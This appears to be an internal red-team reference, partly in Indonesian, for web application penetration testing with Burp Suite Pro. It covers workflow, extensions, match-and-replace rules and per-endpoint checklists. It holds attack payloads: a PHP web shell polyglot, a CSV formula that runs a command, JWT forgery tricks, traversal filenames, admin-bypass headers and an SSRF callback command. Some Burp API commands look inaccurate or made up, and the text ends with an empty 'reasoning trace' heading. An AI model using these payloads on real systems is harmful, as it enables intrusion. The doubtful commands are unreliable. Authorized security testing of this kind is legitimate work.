# w2-burp-gamebook — api

# Burp Suite Pro War Manual — Red Team Internal Reference

Target baseline: Burp Suite Professional 2024.10.x (Java 21), Chrome 131 via bundled Chromium, proxy loopback 127.0.0.1:8080, upstream via SOCKS5 ke egress pool. Semua angka throughput di bawah diasumsikan tuner default kecuali disebut lain.

---

## 1. Urutan Tab / Target Flow Hunting

Kerja tidak boleh lompat tab. Urutan di bawah ini memaksa bukti terkumpul sebelum eksploitasi, sehingga temuan bisa direproduksi oleh operator lain.

| # | Tab / Panel | Tujuan | Artefak keluar | Gate sebelum lanjut |
|---|---|---|---|---|
| 1 | **Target → Scope** | Kunci host, port, protokol, path regex | `scope.json` (Project options export) | Semua host di luar scope berstatus *out-of-scope* di Site map |
| 2 | **Proxy → HTTP history** | Rekam trafik manual + browser | filter `request in scope` + `MIME=HTML/JSON` | history > 50 req, ada ≥1 flow auth |
| 3 | **Target → Site map → Crawl (passive)** | Petakan URL dari history + sitemap.xml + robots.txt | daftar endpoint unik | dedup via `Target → Site map → Copy URLs in scope` |
| 4 | **Scanner → Live scan (passive) + Dashboard** | Issue pasif (headers, TLS, cookie flag) | issues.csv | triase: discard info-level ke backlog |
| 5 | **Param Miner (extension) → Guess params + headers** | Param mining tersembunyi | `param-miner.csv` | ≥3 param baru per endpoint kandidat |
| 6 | **Repeater + Authz/Autorize** | Bangun matriks otorisasi | `authz-matrix.md` | matrix terisi untuk minimal 2 role × 3 endpoint |
| 7 | **Intruder / Turbo Intruder** | Fuzz terarah pada param hasil mining | payload log | rate < WAF threshold |
| 8 | **Collaborator** | OOB verification (SSRF, blind XSS, SSTI) | interaction log | minimal 1 interaksi terkonfirmasi |
| 9 | **Scanner → Active scan (scoped)** | Deteksi kelas vuln umum | issues + PoC request | hanya pada endpoint dengan authz matrix lengkap |

### Perintah shell pendamping

```bash
# export scope dari project Burp (Project options → Misc → Save project options)
# lalu diff scope antar engagement
jq '.target.scope.include' burp-scope.json

# dedup URL in-scope dari HTTP history (klik kanan → Copy URLs in scope)
sort -u urls.txt | awk -F'?' '{print $1}' | sort -u > endpoints.txt

# hitung endpoint per method (dari proxy log via Burp REST API /portswigger)
curl -s -H "Authorization: $(cat burp-api-key)" \
  http://127.0.0.1:8080/v0.1/scope | jq .
```

### Versi konkret di lapangan
- Burp 2024.10.3 (Montoya API 2024.10). Extension lama yang pakai legacy API (pre-2023) **tidak akan load**.
- Chrome 131 headless untuk crawl otomatis; Chromium bundled sering kalah di SPA — pakai `Proxy → Options → Match and replace` untuk inject header `X-Forwarded-Proto: https` bila aplikasi memaksa redirect.

---

## 2. Extension Wajib + Skenario Pakai

Pasang lewat **Extensions → BApp Store** atau file JAR lokal. Urutan load penting supaya hook tidak bentrok.

| Extension | Versi min | Hook Burp | Skenario pakai konkret | Yang dikirim | Yang muncul | Kenapa berhasil / gagal |
|---|---|---|---|---|---|---|
| **Autorize** | 1.0.12 | Proxy | Uji IDOR/BOLA: set cookie user B sebagai "authz header", replay semua request user A | Request user A + cookie user B | Banner hijau (bypass), kuning (enforced tapi status beda), merah (enforced) | Berhasil jika app cek objek via ID saja; gagal jika cek via `tenant_id` di JWT claim yang di-sign |
| **Authz** (PortSwigger "Authz") | 1.0.1 | Repeater | Manual matrix: tampilkan response heatmap untuk N role × M request | N request paralel dengan role berbeda | Tabel status+length | Butuh profil role pre-defined; gagal bila role butuh MFA per request |
| **Turbo Intruder** | 2.0.1 | Repeater/Proxy | Race condition (TOCTOU), single-packet attack, brute force terbatas | N request dalam 1 koneksi TCP (HTTP/2 multiplex) | Response time + body diff | Berhasil bila server tidak pakai DB row lock; gagal bila nginx `limit_req` drop 503 |
| **Collaborator Everywhere** | 1.0.4 | Proxy | Blind SSRF / blind XSS: inject `Burp-Collab` header ke setiap request | Header `X-Forwarded-For`, `Referer`, `User-Agent` diisi domain collab | Interaksi DNS/HTTP di tab Collaborator | Berhasil jika backend resolve header; gagal jika egress egress-filtered |
| **Hunt** | 1.3.5 | Repeater | Tambah tab parameter (reflect, SQLi signature, SSTI polyglot) saat klik kanan request | Polyglot `'"<svg onload>` + `${7*7}` | Highlight diff | Berhasil bila input tercermin tanpa encoding; gagal bila WAF 403 pada polyglot |
| **Param Miner** | 1.5.4 | Repeater | Guess parameter & header tersembunyi (`X-Original-URL`, `X-Rewrite-URL`, `_method`) | Wordlist param + header | Tab "Issues" per host | Berhasil bila router honor header override; gagal bila CDN normalize header |
| **JSON Decoder** | 1.2 | Repeater/Proxy | Decode JWT, base64 JSON body, gzip body untuk dibaca | — | Body ter-decode di panel | Berhasil untuk JWT HS256; gagal untuk JWE 5-part |

### Instalasi headless (CI red team)

```bash
java -jar burpsuite_pro_2024.10.3.jar --project-file=eng.burp --unpause-spider-and-scanner &
# install BApp via CLI (Montoya API exposed)
curl -X POST -H "Authorization: $BURP_KEY" \
  http://127.0.0.1:8080/v0.1/extensions/bapp/store/install \
  -d '{"bapp_uuid":"autorize-uuid"}'
```

---

## 3. Config Match-Replace yang Berguna

**Proxy → Options → Match and replace** (applies to both directions unless noted). Simpan sebagai snippet JSON supaya bisa di-import antar engagement.

| Arah | Tipe | Match | Replace | Tujuan / catatan |
|---|---|---|---|---|
| Request | Header | `^User-Agent:.*` | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36` | Browser spoof untuk endpoint yang blok UA lama |
| Request | Header | `^X-Forwarded-For:.*` | `X-Forwarded-For: 127.0.0.1` | Uji trust proxy; ganti dengan `Collaborator` domain untuk SSRF |
| Request | Header | `^X-Forwarded-Host:.*` | `X-Forwarded-Host: <collab>.oastify.com` | Host header injection / password reset poisoning |
| Request | Header | `^Origin:.*` | (hapus via regex `^Origin:.*\r\n` → empty) | CORS test tanpa Origin |
| Request | Header | `^Host:.*` | `Host: 127.0.0.1:8080` | Uji SSRF loopback / cache poisoning |
| Request | Header | `^Content-Type: application/json` | `Content-Type: application/xml` | Content-type confusion di endpoint dual-parser |
| Response | Header | `^Set-Cookie:(.*); Secure` | `Set-Cookie:$1` | Bypass Secure flag di lab HTTP |
| Response | Header | `^Content-Security-Policy:.*` | (hapus) | Uji XSS tanpa CSP saat dev |
| Response | Body | `\b(?:403|401)\b` (regex body) | `200` | Jarang dipakai; **jangan** di prod — buat false positive di scanner |
| Response | Body | `disabled="disabled"` | (empty) | Uji client-side only bypass |

**Match-replace scope**: selalu aktifkan *"only in scope"* di Burp 2024.10 (`Proxy → Options → Match and replace → target scope`). Tanpa ini, replace `Host:` akan merusak request ke IdP pihak ketiga.

---

## 4. Checklist Pengujian per Tipe Endpoint

Format tiap baris: **kontrol** → **apa yang dikirim** → **evidence yang dicari**. Centang jika evidence tercatat di Repeater + Collaborator.

### 4.1 Auth (login / token / refresh / reset)

- [ ] Credential stuffing terbatas (Turbo Intruder, 5 req/s, 200 kredensial) → cek status+length distribusi. Fail jika rate-limit 429 muncul.
- [ ] Username enumeration: beda error message / timing (`/login` vs `/forgot-password`) → diff body length ≥ 1 byte.
- [ ] JWT: decode via JSON Decoder → uji `alg:none`, HS256→RS256 confusion (kirim public key sebagai HMAC secret), `kid` path traversal (`../../dev/null`).
- [ ] Refresh token rotation: replay old refresh → harus 401. Jika 200 → reuse vuln.
- [ ] Password reset host poisoning: kirim `X-Forwarded-Host: <collab>` di request reset → cek link di email/log Collaborator.
- [ ] MFA bypass: hapus `mfa_verified` cookie / ubah `step=1` → step 2 → step 1.

### 4.2 File Upload

- [ ] Extension bypass: `shell.php.jpg`, `shell.pHp`, `shell.php%00.jpg`, `shell.php;.jpg` → cek response `Content-Type` dan URL hasil.
- [ ] Content-Type spoof: header `image/png` dengan polyglot GIF+PHP (`GIF89a<?php system($_GET[0]);?>`) → fetch via URL publik, apakah dieksekusi.
- [ ] Path traversal di filename: `../../etc/cron.d/x` → cek apakah tertulis di luar upload dir (error message / akses).
- [ ] Zip slip: upload `.zip` berisi `../../x` → trigger extraction (endpoint import) → cek Collaborator/file read.
- [ ] SVG XSS: upload `.svg` dengan `<script>` → buka di Chrome 131, cek eksekusi (SVG sebagai image tidak eksekusi, sebagai dokumen eksekusi).
- [ ] SSRF via URL-upload: endpoint "upload from URL" → `http://<collab>.oastify.com/` → cek DNS + HTTP interaction.
- [ ] Antivirus bypass: EICAR string di file → cek apakah 200 (AV off) atau 400 (AV on). Catat versi scanner bila header `X-Scanned-By` ada.

### 4.3 Export / Report

- [ ] IDOR: `/export?report_id=123` dengan user B → cek isi file milik user A. Auto via Autorize.
- [ ] Injection ke CSV/Excel: isi field `=cmd|' /C calc'!A0` → download, buka di Excel 2411. Jangan buka di mesin operator tanpa sandbox.
- [ ] Formula injection di PDF generator: field `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` → cek PDF output 49 (SSTI).
- [ ] Mass assignment: tambah `"is_admin":true` di body create-report → cek response.
- [ ] Path traversal di `filename` param export → `Content-Disposition: attachment; filename=../../x` → cek header response.
- [ ] DoS ringan: request report besar (10k rows) berulang 20× via Turbo Intruder → cek 5xx / timeout (bukan untuk prod tanpa izin).
- [ ] SSRF di "export from URL" / webhook report → Collaborator.

### 4.4 Admin Panel

- [ ] Direct access tanpa auth: `/admin`, `/admin/`, `/admin..;/`, `/admin%2f`, `X-Original-URL: /admin` (Param Miner) → cek 200 vs 302.
- [ ] Forced browsing wordlist `raft-medium-directories.txt` di scoped host → filter status 200/401/403 di Site map.
- [ ] Auth bypass via header: `X-Forwarded-For: 127.0.0.1`, `X-Real-IP: 127.0.0.1`, `X-Original-URL: /admin` → sering ada di nginx 1.25 conf lama.
- [ ] CSRF pada aksi admin: hapus token, ganti `Content-Type: text/plain`, ganti method `GET` → cek efektif.
- [ ] IDOR ke admin API: `/api/v1/users/{id}/role` dengan role user → Autorize.
- [ ] Session fixation: set `JSESSIONID` sebelum login → cek apakah berubah setelah login.

### 4.5 WebSocket

- [ ] Handshake authz: buka WS sebagai user A dengan cookie user B → apakah upgrade 101 tetap jalan (bukan 401).
- [ ] Message-level authz: kirim message dengan `user_id` lain → cek echo response. Auto via Repeater "WebSockets history".
- [ ] CSRF via WS: browser tidak kirim origin check → uji `Origin: https://evil.test` di handshake → cek 101.
- [ ] Race condition: 2 message paralel via Turbo Intruder WS mode (single-packet) → cek state duplicate.
- [ ] Injection: kirim payload polyglot ke setiap field JSON → cek error / reflect.
- [ ] DoS ringan: 10k pesan 1KB dalam 5 detik → cek connection drop / memori (hanya di lab).
- [ ] Cross-site WebSocket hijacking: form/JS di origin lain → cek handshake menerima `Origin: null`.

---

## 5. Payload & Snippet Referensi Cepat

### Turbo Intruder — single-packet attack (race)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.HTTP2)
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')
```

### Autorize — setup cepat
1. Login user B → copy cookie.
2. Autorize → "Add" → paste cookie di "Authorization header".
3. Set "Intercept requests" = ON, "Intercept responses" = ON.
4. Klik kanan request user A → "Autorize this request".

### Collaborator payload generator (shell)

```bash
COLLAB="abc123.oastify.com"
curl -s "http://target/api/import" \
  -H "Content-Type: application/json" \
  -d "{\"url\":\"http://$COLLAB/ssrf1\",\"callback\":\"https://$COLLAB/x\"}" \
  -x http://127.0.0.1:8080
```

### Hunt di Repeater
- Klik kanan request → Extensions → Hunt → "Scan" → tab baru "Hunt" muncul dengan highlight.
- Cek kolom: `Reflected`, `SSTI`, `SQLi`, `Command-Injection`, `Path-Traversal`.

---

## 6. Jebakan Operasional (yang bikin teknik gagal di lapangan)

1. **Scope bocor.** Match-replace `Host:` tanpa scope filter → semua request ke IdP (Okta/Azure AD) ikut di-rewrite, sesi hilang, history penuh noise. Selalu set `Proxy → Options → Match and replace → "only in scope"` di Burp 2024.10+.

2. **SPA + service worker.** Crawl passive tidak menembus SPA; service worker Chrome 131 cache request POST. Solusi: clear SW di DevTools, atau pakai Chrome profile baru per crawl; enable "Proxy → Options → Intercept client requests = ON" untuk lihat fetch yang di-cache.

3. **HTTP/2 + nginx 1.25 `limit_req`.** Turbo Intruder single-packet attack gagal (503) karena `limit_req_zone` drop burst. Turunkan `concurrentConnections=1`, `requestsPerConnection=20`, atau pakai `HTTP/1.1` jika target HTTP/2 saja.

4. **Autorize false negative dari JWT claim.** App cek `tenant_id` di JWT, bukan di URL. Autorize hanya ganti cookie → tetap 200 untuk user B karena claim ikut. Solusi: pakai Authz extension dengan profil role lengkap (cookie + header), atau manual Repeater.

5. **Extension legacy API.** Hunt 1.3.5 & JSON Decoder 1.2 masih load di Montoya API 2024.10, tapi **banyak extension BApp lama tidak**. Jika tab extension kosong, cek log `Extensions → Installed → Errors`.

6. **Collaborator egress filter.** Banyak target prod blokir egress ke `*.oastify.com` (DNS sinkhole). Uji dulu dengan `curl` dari host target via SSRF sederhana; jika 0 interaksi padahal request terkirim, buka custom Collaborator server (self-hosted) di domain non-blacklist.

7. **Match-replace `Content-Length`.** Jika replace body tanpa update `Content-Length`, request hang. Gunakan "Fix Content-Length" di `Proxy → Options → Misc` (default ON di 2024.10, tapi sering di-disable operator).

8. **Limit history.** Burp 2024.10 default 1000 item di HTTP history; crawl besar memangkas item awal. Naikkan `Proxy → Options → HTTP history → history size` ke 50000 atau export ke `history.xml` tiap fase.

9. **WebSocket di Repeater.** Butuh plugin? Tidak — Burp 2024.10 punya native WS Repeater, tapi **tidak replay multiple frame**; untuk race WS butuh Turbo Intruder mode WS (`engine=Engine.HTTP2` tidak support WS frame, pakai `Engine.HTTP1` + `webSocket=target` di script).

10. **JSON Decoder vs JWE.** Extension hanya handle JWS (`xxx.yyy.zzz`); token 5-part JWE akan error. Decode manual via `openssl` atau `jose` CLI.

11. **Chrome 131 bundled** default `--disable-web-security`? Tidak — tapi `Burp → Proxy → Intercept → "Intercept Client Requests"` bisa memblokir `wss://` handshake jika rule tidak include `^wss`. Tambahkan regex `^wss?://` di scope include.

12. **TLS pinning di mobile app.** Burp CA tidak dipercaya; app Android 14+ (target SDK 34) tolak user CA. Perlu Frida `frida-android-repinning` atau Magisk module; jangan buang waktu debug di Burp jika handshake selalu `Remote host terminated`.

13. **Rate-limit IDOR.** Autorize mengirim 1 request per flow; endpoint dengan rate-limit 5/min akan 429 semua dan tampil "enforced" (false negative). Set delay 12 detik di Autorize atau split batch.

14. **Project file corruption.** Burp 2024.10 crash saat save project > 4 GB (Java heap default 2 GB). Set `-Xmx8g` di startup dan rotasi project per fase (`scoping.burp`, `hunt.burp`, `exploit.burp`).

15. **Scanner active di endpoint export.** Active scan pada `/export` besar menghasilkan 10k request dan bisa DoS backend. Exclude `/export`, `/download`, `/report` dari active scan scope; uji manual.

---

## [reasoning trace]


